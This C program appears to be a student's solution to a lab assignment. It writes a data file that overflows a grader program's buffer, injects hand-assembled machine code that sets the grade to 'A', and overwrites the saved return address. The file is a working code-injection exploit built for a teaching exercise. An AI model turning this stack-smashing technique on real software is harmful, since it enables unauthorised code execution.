/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Tyler Campbell and Lauren Johnston                         */
/*--------------------------------------------------------------------*/

#define MAX_BUFFER_LENGTH 72
#include <stdio.h>
#include <string.h>

/* Produces a file named dataA, that causes the grader program to write
our names (Tyler & Lauren) and recommend a grade of "A" by using a
buffer overrun attack */
int main(void)
{
	FILE* file;
	int i;
	unsigned char name[MAX_BUFFER_LENGTH];
	unsigned long data;
	
	/* open file */
	file = fopen("dataA", "w");

	/* name string */
	name[0] = 'T';
	name[1] = 'y';
	name[2] = 'l';
	name[3] = 'e';
	name[4] = 'r';
	name[5] = ' ';
	name[6] = '&';
	name[7] = ' ';
	name[8] = 'L';
	name[9] = 'a';
	name[10] = 'u';
	name[11] = 'r';
	name[12] = 'e'; 
	name[13] = 'n';
	name[14] = '\0';
	/* mov 'A' to &grade */
	name[15] = 0xc6;
	name[16] = 0x04;
	name[17] = 0x25;
	name[18] = 0x84;
	name[19] = 0x80;
	name[20] = 0x6b;
	name[21] = 0x00;
	name[22] = 0x41;
	/* jmp main + offset (0x400e9b) */
	name[23] = 0xe9; 
	name[24] = 0x59;
	name[25] = 0x5d;
	name[26] = 0xd4;
	name[27] = 0xff;
	
	for (i = 0; i < 15; i++)
		putc(name[i], file);
	
	for (i = 15; i < 72; i++)
	{
		data = name[i];
		fwrite(&data, 1, 1, file);
	}
	
	/* overwrite rip */
	data = 0x6bb12f;
	fwrite(&data, 8, 1, file);

	return 0;
}